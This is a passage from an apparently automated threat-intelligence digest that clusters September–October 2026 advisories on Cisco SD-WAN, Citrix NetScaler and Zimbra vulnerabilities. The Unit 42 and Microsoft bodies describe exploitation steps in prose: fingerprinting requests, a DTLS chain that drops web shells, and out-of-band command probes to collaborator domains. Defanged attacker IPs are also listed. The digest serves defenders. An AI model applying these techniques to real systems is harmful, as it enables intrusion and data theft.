waiting for a regular patch cycle: Cisco Catalyst SD-WAN Software release First fixed release Earlier than 20.9 Migrate to a fixed release 20.9 20.9.10.1 20.12 20.12.8.2 20.15 20.15.6.1 20.18 20.18.4.1 26.1 26.1.2.1 26.2 26.2.1 Cisco has addressed the vulnerability in the cloud-based Cisco SD-WAN Cloud (Cisco Managed) release 20.15.605 , and indicates that no customer action is required for that service. There are no workarounds. As a temporary mitigation, Cisco recommends that on-premises customers prevent access to the system from unsecured networks. If internet access is required, restrict access to known, trusted hosts and protect Cisco Catalyst SD-WAN control components behind a filtering device. Cisco indicates that this mitigation is already deployed in Cisco Catalyst SD-WAN Cloud Hosted environments. Organizations should apply updates even when the mitigation is in place. Because active exploitation has occurred, Rapid7 strongly recommends that organizations audit affected systems for compromise. For help assessing a potentially compromised system, Cisco customers may open a Severity 3 TAC case with CVE-2026-76504 in the title and provide an admin-tech file generated with the request admin-tech command. For the latest mitigation guidance and release compatibility information, please refer to the vendor's security advisory . Rapid7 customers Exposure Command, Vulnerability Management, and Nexpose Exposure Command, Vulnerability Management, and Nexpose customers can
```

#### Corroborating sources (3)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Critical Cisco Catalyst SD-WAN Manager API authentication bypass exploited in the wild (CVE-2026-76504)
  - Published: 2026-09-30T15:09:22+00:00
  - Link: https://www.rapid7.com/blog/post/etr-critical-cisco-catalyst-sd-wan-manager-api-authentication-bypass-exploited-in-the-wild-cve-2026-76504
  - Summary: Overview On September 30, 2026, Cisco published a security advisory for CVE-2026-76504 , a critical API authentication bypass vulnerability affecting Cisco Catalyst SD-WAN Manager. The vulnerability has a CVSSv3.1 score of 9.8 and results from improper handling of URL encoding ( CWE-177 ). An unauthenticated, remote attacker can send a crafted HTTP request that bypasses an authentication rule for a specific API endpoint, gaining access to the API with the privileges of the admin user. According to Cisco, CVE-2026-76504 is being actively exploited in the wild; Cisco PSIRT became aware of the activity in September 2026. Cisco Catalyst SD-WAN Manager systems with ports exposed to the internet are at risk of compromise. The vulnerability affects the product regardless of system configuration, and Cisco has not provided a workaround, however vendor supplied updates are available. Rapid7 strongly recommends that organizations upgrade affected systems to a fixed release on an emergency basis,
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-76504 | Cisco Catalyst SD-WAN Manager API Authentication Bypass Vulnerability | Reversed by Horizon3
  - Published: 2026-10-01T00:35:46+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76504/
  - Summary: CVE-2026-76504 is a critical, actively exploited Cisco Catalyst SD-WAN Manager vulnerability that allows unauthenticated API access as the admin user. Horizon3 reverse engineered the flaw, and NodeZero® Rapid Response safely validates exposure.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cisco Warns of Attackers Exploiting Critical Authentication Bypass in SD-WAN Manager
  - Published: 2026-09-30T15:24:54+00:00
  - Link: https://thehackernews.com/2026/09/cisco-warns-of-attackers-exploiting.html
  - Summary: Attackers are exploiting a new critical zero-day flaw in Cisco Catalyst SD-WAN Manager, the system companies use to manage their Cisco SD-WAN networks, Cisco said in an advisory on September 30. The flaw, CVE-2026-76504, could allow a remote attacker with no login access to use the Manager's API as the admin user. Fixed releases are available, and there is no workaround. It carries a

### Cluster e51eaa3924 — score 43

- Title: Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30)
- Source: Unit 42 (threat_research_primary)
- Published: 2026-09-30T20:00:04+00:00
- Link: https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-88771, CVE-2026-88772

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, web_shell_backdoor, zero_day
- affected_products: Citrix, Palo Alto Networks
- cve_ids: CVE-2026-88771, CVE-2026-88772
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, ddos, web_shell_backdoor, active_exploitation
- affected_products: Palo Alto Networks
- cve_ids: CVE-2026-88771, CVE-2026-88772
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
Unit 42 is aware of possible 0-day activity against NetScaler devices. Citrix reports CVE-2026-88771, CVE-2026-88772 have been exploited in the wild. The post Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30) appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center High Profile Threats Vulnerabilities Vulnerabilities Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30) 9 min read Related Products Advanced Threat Prevention Advanced URL Filtering Cloud-Delivered Security Services Cortex Cortex Xpanse Next-Generation Firewall Unit 42 Incident Response By: Unit 42 Published: September 30, 2026 Categories: High Profile Threats Vulnerabilities Tags: Citrix CVE-2026-88771 CVE-2026-88772 Denial of service Remote Code Execution Zero-day Share Executive Summary Unit 42 is aware of possible zero-day activity against NetScaler devices. In a Citrix report that details several CVEs , they noted that CVE-2026-88771 and CVE-2026-88772 have been exploited in the wild. The threat actors exploited these vulnerabilities to deliver web shells and establish their initial access and persistence into organizations. Analysis is ongoing to determine any post-compromise activity. As of Sept. 27, 2026, Palo Alto Networks Cortex Xpanse has identified 50,277 exposed instances that could potentially be vulnerable to these CVEs based on our telemetry. It is important to note that activity after Sept. 27, 2026 might not match the same indicators of compromise (IoCs) or tactics, techniques and procedures (TTPs) from the original zero-day activity. We group pre-disclosure and post-disclosure activities to differentiate what we believe the original actors were doing with the exploit from what additional actors, security researchers and internet scanning tools are doing now that the vulnerabilities are public. The vulnerabilities are: CVE-2026-88771 : A remote code execution (RCE) vulnerability that fails to properly validate input and allows an unauthenticated actor to run commands against NetScaler Application Delivery Controller (ADC) and NetScaler Gateway systems CVE-2026-88772 : A memory overflow vulnerability that can lead to a remote code execution (RCE) or denial of service (DoS) on the Datagram Transport Layer Security (DTLS) configuration on NetScaler ADC and NetScaler Gateway systems Both vulnerabilities have a CVSS v4.0 base score of 9.5. Palo Alto Networks customers are better protected from this activity through our products and services, such as: Advanced URL Filtering Next-Generation Firewall with Advanced Threat Prevention Cortex XDR and XSIAM The Unit 42 Incident Response team can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk. Vulnerabilities Discussed CVE-2026-88771 , CVE-2026-88772 Pre-Disclosure Activity This section is our analysis of threat activity that occurred prior to the public disclosure of these zero-day vulnerabilities. We saw two groups of web shell activity: Datagram Transport Layer Security (DTLS) exploitation dropping .deb web shell files A three-stage command injection exploit chain that drops PHP web shells Initial Activity: Fingerprinting NetScaler Devices The earliest activity we identified occurred on Aug. 21, 2026, from two hosts, one at 104.248.244[.]66 and one at 77.83.199[.]39 . First, 104.248.244[.]66 requested /admin_ui/common/css/ns/ui.css from a NetScaler Gateway appliance at a US-based organization. Approximately two hours later, the host at 77.83.199[.]39 requested the same file, /admin_ui/common/css/ns/ui.css . Nearly two hours after that second request, 77.83.199[.]39 requested /vpn/js/rdx/core/lang/rdx_en.json.gz . These requests are consistent with version fingerprinting. On August 21 and 22, these two hosts and 78.47.24[.]217 sent the same requests to more than 100 other systems. CVE-2026-88772: DTLS Exploitation To .deb Webshell Activity In this exploit chain, the attacker sends crafted DTLS traffic to a vulnerable NetScaler device, which processes the malicious packet. This malicious packet causes memory corruption or a crash that can lead to either code execution or denial of service. Between September 4 and 24, the threat actor repe
```

#### Corroborating sources (2)

- **Unit 42** (threat_research_primary)
  - Title: Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30)
  - Published: 2026-09-30T20:00:04+00:00
  - Link: https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/
  - Summary: Unit 42 is aware of possible 0-day activity against NetScaler devices. Citrix reports CVE-2026-88771, CVE-2026-88772 have been exploited in the wild. The post Threat Brief: NetScaler Zero Days CVE-2026-88771 and CVE-2026-88772 Exploited in the Wild (Updated September 30) appeared first on Unit 42 .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Citrix NetScaler CVE-2026-88772 Exploit Details Show Pre-Auth Path to Shellcode Execution
  - Published: 2026-09-30T05:30:30+00:00
  - Link: https://thehackernews.com/2026/09/citrix-netscaler-cve-2026-88772-exploit.html
  - Summary: Cybersecurity researchers have disclosed technical details of a recently patched critical security flaw in Citrix NetScaler ADC and Gateway that has come under active exploitation in the wild. The vulnerability, tracked as CVE-2026-88772 (CVSS score: 9.5), has been described as a memory overflow bug in the Datagram Transport Layer Security (DTLS) protocol handling that's rooted in the NetScaler

### Cluster bd1b3dce0b — score 37

- Title: Citrix NetScaler Zero-Day Exploited in the Wild Crashes SAML Authentication Services
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-10-05T18:25:16+00:00
- Link: https://orca.security/resources/research/citrix-netscaler-zero-day-exploited-in-the-wild-crashes-saml-authentication-services/
- Fetch status: ok
- Member count: 7
- Corroborating source count: 5
- Strong signals: CVE-2026-88779, Citrix

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, data_breach, ddos, supply_chain, web_shell_backdoor, zero_day
- affected_industries: education, financial_services, government, legal_professional
- affected_products: Citrix, WordPress, npm
- cve_ids: CVE-2026-88779
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day, data_breach, ddos, active_exploitation
- affected_industries: government
- affected_products: Citrix, npm, WordPress
- cve_ids: CVE-2026-88779
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Executive Summary A high-severity memory overflow vulnerability (CVE-2026-88779, CVSS v4.0 8.7) was disclosed affecting Citrix NetScaler ADC and NetScaler Gateway, allowing attackers to crash the SAML authentication service via crafted network requests. Due to the potential for prolonged service outages blocking VPN and SSO access across entire organizations, immediate patching is required. About CVE-2026-88779 The […]
```

#### Full body

```
Executive Summary A high-severity memory overflow vulnerability (CVE-2026-88779, CVSS v4.0 8.7) was disclosed affecting Citrix NetScaler ADC and NetScaler Gateway, allowing attackers to crash the SAML authentication service via crafted network requests. Due to the potential for prolonged service outages blocking VPN and SSO access across entire organizations, immediate patching is required. About CVE-2026-88779 The issue originates from the nsaaad SAML authentication handler, where a memory overflow (CWE-119) in the processing of SAML authentication requests leads to a service crash. By sending specially crafted authentication requests to appliances configured as a SAML service provider or SAML identity provider, attackers can take down the authentication service, potentially locking out all users from VPN and SSO access. Repeated triggering can keep services offline indefinitely. No authentication is required to exploit this issue. Affected Systems The following components are affected: NetScaler ADC and NetScaler Gateway, versions 14.1 before 14.1-73.41 and 13.1 before 13.1-64.28; NetScaler ADC 14.1-FIPS before 14.1-73.41; and NetScaler ADC 13.1-FIPS and 13.1-NDcPP before 13.1-37.282. These components are widely deployed across enterprise environments for VPN, load balancing, and single sign-on, particularly when SAML authentication is enabled via add authentication samlAction (SAML SP) or add authentication samlIdPProfile (SAML IdP) configurations. Citrix-managed cloud services are not affected, but Secure Private Access Hybrid deployments using vulnerable NetScaler instances are in scope. Users should upgrade to NetScaler ADC/Gateway 14.1-73.41 or later, or 13.1-64.28 or later (with corresponding FIPS/NDcPP versions). Appliance administrators should also check for SAML configuration exposure and monitor for unexplained nsaaad service crashes or appliance reboots as indicators of compromise. The attacker IP 213.209.159[.]55 has been observed in exploitation attempts and should be blocked. Risk Impact At the time of writing, watchTowr Labs has independently reproduced the vulnerability after observing NetScaler honeypot activity, and Citrix has confirmed targeted exploitation in the wild. CISA added CVE-2026-88779 to its Known Exploited Vulnerabilities catalog on October 4, 2026, setting a mandatory remediation deadline of October 7 for federal agencies. Some researchers have noted indications that the memory overflow may also enable remote code execution beyond the documented denial-of-service scope, though this has not been officially confirmed by Citrix. This is the sixth exploited NetScaler vulnerability added to CISA KEV in 2026. Regardless, the severity and ease of exploitation make this vulnerability high risk, especially in internet-facing deployments. Successful exploitation could allow attackers to crash authentication services and lock out entire organizations, sustain prolonged outages through repeated triggering, and potentially achieve remote code execution, leading to service disruption, data exposure, or full infrastructure compromise. How Orca Can Help Orca enables customers to quickly identify assets running vulnerable NetScaler versions, understand their exposure in context — including internet accessibility, runtime reachability, and asset criticality — and prioritize remediation based on real risk rather than CVSS alone. Orca’s platform highlights affected assets directly in the alert view, helping security teams focus on the most critical remediation paths first. Related articles Research Critical Citrix NetScaler Zero-Days Under Active Exploitation Sep 29, 2026 Research WordPress "Comment2Shell" XSS-to-RCE Chain Lets Unauthenticated Attackers Compromise Servers via Malicious Comments Sep 22, 2026 Research npm Supply-Chain Attack Abuses Trusted Publishing to Ship GHAPPIER Loader Sep 22, 2026 Stay in the loop Keep up to date with everything you need to know about cloud security and our latest research By
```

#### Corroborating sources (5)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Citrix NetScaler Zero-Day Exploited in the Wild Crashes SAML Authentication Services
  - Published: 2026-10-05T18:25:16+00:00
  - Link: https://orca.security/resources/research/citrix-netscaler-zero-day-exploited-in-the-wild-crashes-saml-authentication-services/
  - Summary: Executive Summary A high-severity memory overflow vulnerability (CVE-2026-88779, CVSS v4.0 8.7) was disclosed affecting Citrix NetScaler ADC and NetScaler Gateway, allowing attackers to crash the SAML authentication service via crafted network requests. Due to the potential for prolonged service outages blocking VPN and SSO access across entire organizations, immediate patching is required. About CVE-2026-88779 The […]
- **Sophos X-Ops** (detection_response_operations)
  - Title: Citrix NetScaler vulnerability (CVE-2026-88779) in active exploitation
  - Published: 2026-10-05T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/citrix-netscaler-vulnerability-cve-2026-88779-in-active-exploitation
  - Summary: Categories: Threat Research Tags: advisory, vulnerability, Citrix
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Attackers exploited Citrix NetScaler zero-day for at least three weeks undetected
  - Published: 2026-09-29T21:30:22+00:00
  - Link: https://cyberscoop.com/citrix-netscaler-zero-day-attacks-three-weeks-undetected/
  - Summary: Mandiant researchers said dozens of organizations have been impacted by attacks attributed to advanced and suspected state-sponsored threat groups. They expect more attacks to come. The post Attackers exploited Citrix NetScaler zero-day for at least three weeks undetected appeared first on CyberScoop .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: New NetScaler Zero-Day Exploited in Targeted Attacks Can Knock SAML Deployments Offline
  - Published: 2026-10-05T06:40:19+00:00
  - Link: https://thehackernews.com/2026/10/new-netscaler-zero-day-exploited-in.html
  - Summary: Citrix has released security updates for a high-severity security flaw in NetScaler ADC and NetScaler Gateway that has been exploited as part of targeted zero-day attacks. The vulnerability, tracked as CVE-2026-88779, carries a CVSS score of 8.7 out of 10.0. "CVE-2026-88779 is a memory overflow vulnerability in Citrix NetScaler ADC and Citrix NetScaler Gateway that can lead to
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Citrix NetScaler Targeted Via New Zero Day
  - Published: 2026-10-05T13:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/citrix-netscaler-zero-day/
  - Summary: The memory buffer vulnerability can result in denial of service to customers, with CISA warning it poses “significant risks” to the federal government

### Cluster a14cf81e36 — score 29

- Title: Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-30T14:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: CVE-2026-73570

#### Cluster taxonomy (union across members)
- affected_products: Microsoft Defender
- cve_ids: CVE-2026-73570
- urgency_signals: preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- affected_products: Microsoft Defender
- cve_ids: CVE-2026-73570
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft Threat Intelligence examines CVE-2026-73570 exploitation in Zimbra, including observed attack paths, detection opportunities, and mitigation guidance. The post Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570 appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Topics Actionable threat insights Threat intelligence Microsoft Threat Intelligence identified and tracked exploitation of CVE-2026-73570 , an unauthenticated OS command injection vulnerability in the Zimbra Collaboration Suite SNMP notification path. Exploitation can be triggered by a specially crafted email against internet-facing Zimbra servers when the optional zimbra-snmp package is installed and SNMP notifications are enabled, without requiring authentication or user interaction. Following successful exploitation, observed activity included deployment of JSP web shells and reverse shells, privilege escalation, persistent remote-access tooling, and memory-backed execution. Threat actors also accessed email and collected authentication and mailbox data, with archive creation and subsequent transfer activity observed. The activity included both automated payload delivery and hands-on-keyboard operations on compromised mail servers. Microsoft observed affected organizations in more than one region and industry. Based on the environments investigated, exploitation was not limited to a single sector or geographic area. The diagram combines behaviors observed across multiple confirmed compromises; no single host necessarily exhibited every stage. From remediation to public disclosure CVE-2026-73570 is an unauthenticated OS command-injection vulnerability in the Zimbra Collaboration Suite SNMP notification path. An attacker can send a specially crafted SMTP request that introduces untrusted input into SNMP notification processing. If the input is not sufficiently sanitized, embedded shell commands can execute with the privileges of the zimbra service account. Exploitation requires the optional zimbra-snmp package to be installed and SNMP notifications to be enabled. Zimbra version 10.1.20, released July 20, 2026, contains the relevant remediation. CVE-2026-73570 was publicly disclosed on August 13, 2026. Microsoft telemetry identified activity targeting the same injection path during the interval between those events. Attack chain overview Figure 1. CVE-2026-73570 attack chain, mapped to MITRE ATT&CK tactics and composited across all confirmed compromises. Pre-disclosure reconnaissance and pre-exploitation probing Between July 28 and August 7, after a fix became available on July 20 but before public disclosure on August 13, Microsoft observed two distinct out-of-band scanning tools probing the vulnerable injection point. The activity used the same swatchdog-to-snmptrap execution path later observed during exploitation. The operators first validated command execution using lightweight out-of-band probes to unique subdomains hosted on public interaction and collaborator services, including oast[.]fun, oast[.]online, dnslog[.]pp[.]ua, requestrepo[.]com, and campaign-associated infrastructure under bypass[.]eu[.]org. The probes included HTTP requests and DNS, ICMP, and in-band identity checks, using commands such as curl, wget, ping, nslookup, and id. HTTP requests used the CVE-specific ZB73570 User-Agent, while DNS and ICMP requests used randomized callback subdomains. The probes were designed to confirm execution without delivering a payload by performing local identity checks or dropping a small system fingerprint script, demonstrating both command execution and external access to the server’s webroot. Figure 2. Out-of-band command-execution validation using HTTP, DNS, and ICMP callbacks to unique collaborator subdomains. Initial access CVE-2026-73570 allows a crafted SMTP request containing shell metacharacters to reach Zimbra’s SNMP notification processing. When a service-state change triggers health monitoring, swatchdog incorporates the attacker-controlled value into a snmptrap shell invocation, enabling command execution. Figure 3. CVE-2026-73570 command-injection sequence that changes webroot permissions, reconstructs encoded fr
```

#### Corroborating sources (3)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570
  - Published: 2026-09-30T14:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
  - Summary: Microsoft Threat Intelligence examines CVE-2026-73570 exploitation in Zimbra, including observed attack paths, detection opportunities, and mitigation guidance. The post Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570 appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570
  - Published: 2026-09-30T14:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
  - Summary: Microsoft Threat Intelligence examines CVE-2026-73570 exploitation in Zimbra, including observed attack paths, detection opportunities, and mitigation guidance. The post Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570 appeared first on Microsoft Security Blog .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit Zimbra Flaw to Deploy Web Shells and Harvest Authentication Secrets
  - Published: 2026-09-30T16:46:29+00:00
  - Link: https://thehackernews.com/2026/09/attackers-exploit-zimbra-flaw-to-deploy.html
  - Summary: Threat actors have weaponized a now-patched security flaw in Zimbra Collaboration Suite (ZCS) to deploy web shells and access mailbox data, according to findings from the Microsoft Security Research team. The attack exploits CVE-2026-73570 (CVSS score: 8.9), an unauthenticated operating system command injection flaw that can lead to remote code execution when Simple Network Management Protocol

### Cluster 1f0734997f — score 28

- Title: Vulnerability Discovery and Exploitation Trends in the AI Era
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-09-30T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/vulnerability-discovery-and-exploitation-trends-in-the-ai-era/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, vulnerability_disclosure, zero_day
- affected_products: Linux kernel
- urgency_signals: zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day, vulnerability_disclosure, active_exploitation
- affected_products: Linux kernel
- urgency_signals: zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
Written by: Robin Grunewald, Supriya Mazumdar, Kelli Vanderlee Introduction Google Threat Intelligence Group (GTIG) examines vulnerability disclosure and exploitation statistics to evaluate the impact of artificial intelligence (AI) on the vulnerability threat landscape. We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered. Key findings: Vulnerability disclosures doubled: the number of vulnerabilities disclosed per month doubled, rising from 5,045 in January 2026 to 10,477 in July and continuing to climb to 10,740 in August 2026. Vulnerability exploitation nearly doubled: the number of vulnerabilities exploited increased from an average of 10.5 per month in 2025 to an average of 18 per month from January 2026 to August 2026. Zero-day exploitation increased marginally: zero-day vulnerability exploitation grew from an average of 8 per month in 2025 t
```

#### Full body

```
Threat Intelligence Vulnerability Discovery and Exploitation Trends in the AI Era September 30, 2026 Google Threat Intelligence Group Google Threat Intelligence Visibility and context on the threats that matter most. Contact Us & Get a Demo Written by: Robin Grunewald, Supriya Mazumdar, Kelli Vanderlee Introduction Google Threat Intelligence Group (GTIG) examines vulnerability disclosure and exploitation statistics to evaluate the impact of artificial intelligence (AI) on the vulnerability threat landscape. We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered. Key findings: Vulnerability disclosures doubled: the number of vulnerabilities disclosed per month doubled, rising from 5,045 in January 2026 to 10,477 in July and continuing to climb to 10,740 in August 2026. Vulnerability exploitation nearly doubled: the number of vulnerabilities exploited increased from an average of 10.5 per month in 2025 to an average of 18 per month from January 2026 to August 2026. Zero-day exploitation increased marginally: zero-day vulnerability exploitation grew from an average of 8 per month in 2025 to an average of 11 per month from January 2026 to August 2026. AI finds more consequential vulnerabilities: AI-assisted discovery found proportionally fewer Low-Risk vulnerabilities, more Moderate-Risk vulnerabilities, and more vulnerabilities leading to remote code execution (RCE). GTIG expects that vulnerability discovery and exploitation will continue to grow in the short to medium term. To counter the increased risk from rapid vulnerability discovery and exploitation, organizations must transition from unprioritized mass-patching to threat-intelligence-driven triage, combining targeted edge-defense with automated, agentic remediation. Scope & Methodology This GTIG analysis examines trends in vulnerabilities disclosed from January 1, 2025 through August 31, 2026. The dataset tracks the vulnerabilities alongside critical operational dimensions, including exploitation consequences and GTIG Vulnerability Risk Ratings , and in-the-wild exploitation. When we refer to risk ratings in this blog, we are using GTIG vulnerability risk ratings, not CVSS severity . While the baseline monitoring encompasses the full 20-month window (January 2025–August 2026), this report specifically focuses on growth velocity and emerging threat vectors. The research seeks to evaluate the impact of AI across the cybersecurity landscape both in terms of rates of Common Vulnerabilities and Exposures (CVE) disclosure and rates of exploitation. We also examine vulnerabilities targeting the AI/large language model (LLM) operational stack. CVE Disclosure Doubled in 2026 Vulnerability disclosures doubled from 5,045 in January 2026 to 10,477 in July, with the count of disclosed vulnerabilities reaching a peak of 10,740 in August (Figure 1). Distinguishing Threat Risk from CVE Inflation However, raw disclosure volume throughout 2026 can be misleading without threat intelligence context. Automated CVE Numbering Authority (CNA) assignment policies across open-source ecosystems can inflate baseline figures; for instance, vulnerabilities with a description containing “Linux Kernel” alone generated approximately 5,000 CVEs between January 2026 and August 2026 with zero observed exploited in-the-wild zero-days. Figure 1: Count of vulnerabilities disclosed, January 2025 - August 2026 (Source: GTIG) In terms of risk ratings, the most interesting increase occurred in High-Risk vulnerabilities, which surged from 131 disclosures in January 2026 to 350 in August 2026, a 167% growth (Figure 2). High-Risk vulnerabilities remain a small proportion (3% in August 2026) of all vulnerabilities disclosed. Figure 2: Count of vulnerabilities disclosed by GTIG vulnerability risk rating, January 2025 - August 2026 (Source: GTIG) The increase in High-Risk vulnerabiliti
```

#### Corroborating sources (2)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: Vulnerability Discovery and Exploitation Trends in the AI Era
  - Published: 2026-09-30T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/vulnerability-discovery-and-exploitation-trends-in-the-ai-era/
  - Summary: Written by: Robin Grunewald, Supriya Mazumdar, Kelli Vanderlee Introduction Google Threat Intelligence Group (GTIG) examines vulnerability disclosure and exploitation statistics to evaluate the impact of artificial intelligence (AI) on the vulnerability threat landscape. We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered. Key findings: Vulnerability disclosures doubled: the number of vulnerabilities disclosed per month doubled, rising from 5,045 in January 2026 to 10,477 in July and continuing to climb to 10,740 in August 2026. Vulnerability exploitation nearly doubled: the number of vulnerabilities exploited increased from an average of 10.5 per month in 2025 to an average of 18 per month from January 2026 to August 2026. Zero-day exploitation increased marginally: zero-day vulnerability exploitation grew from an average of 8 per month in 2025 t
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Vulnerability Discovery and Exploitation Trends in the AI Era
  - Published: 2026-09-30T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/vulnerability-discovery-and-exploitation-trends-in-the-ai-era/
  - Summary: Written by: Robin Grunewald, Supriya Mazumdar, Kelli Vanderlee Introduction Google Threat Intelligence Group (GTIG) examines vulnerability disclosure and exploitation statistics to evaluate the impact of artificial intelligence (AI) on the vulnerability threat landscape. We found that AI is measurably changing not just the pace of vulnerability discovery and exploitation, but also the types and typical risk profiles of vulnerabilities that are being discovered. Key findings: Vulnerability disclosures doubled: the number of vulnerabilities disclosed per month doubled, rising from 5,045 in January 2026 to 10,477 in July and continuing to climb to 10,740 in August 2026. Vulnerability exploitation nearly doubled: the number of vulnerabilities exploited increased from an average of 10.5 per month in 2025 to an average of 18 per month from January 2026 to August 2026. Zero-day exploitation increased marginally: zero-day vulnerability exploitation grew from an average of 8 per month in 2025 t

### Cluster 143cae0708 — score 27

- Title: More RMM Tools In the Wild, (Tue, Oct 6th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-06T13:16:02+00:00
- Link: https://isc.sans.edu/diary/rss/33400
- Fetch status: fetch_failed:HTTPError
- Member count: 2
- Corroborating source count: 1
- Strong signals: ScreenConnect

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: ScreenConnect
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: ScreenConnect
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
It seems that a trend startedâ€¦ I continue my journey discovering more RMM ("Remote Management & Monitoring") tools abused by threat actors! A few days ago, I wrote a diary[ 1 ] about ScreenConnect used in the wild. Today, I found another one.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: More RMM Tools In the Wild, (Tue, Oct 6th)
  - Published: 2026-10-06T13:16:02+00:00
  - Link: https://isc.sans.edu/diary/rss/33400
  - Summary: It seems that a trend startedâ€¦ I continue my journey discovering more RMM ("Remote Management & Monitoring") tools abused by threat actors! A few days ago, I wrote a diary[ 1 ] about ScreenConnect used in the wild. Today, I found another one.

### Cluster 257c7d4fe7 — score 20

- Title: Citrix discloses third actively exploited NetScaler zero-day in less than a week
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-10-05T23:07:17+00:00
- Link: https://cyberscoop.com/citrix-netscaler-third-exploited-zero-day-vulnerability/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, zero_day
- affected_products: Citrix
- cve_ids: CVE-2026-88771, CVE-2026-88779
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, ddos, active_exploitation
- affected_products: Citrix
- cve_ids: CVE-2026-88779, CVE-2026-88771
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The vendor was much quicker and consistent in its response to the latest defect, and researchers consider the impact relatively low compared to the previous pair of zero-days. The post Citrix discloses third actively exploited NetScaler zero-day in less than a week appeared first on CyberScoop .
```

#### Full body

```
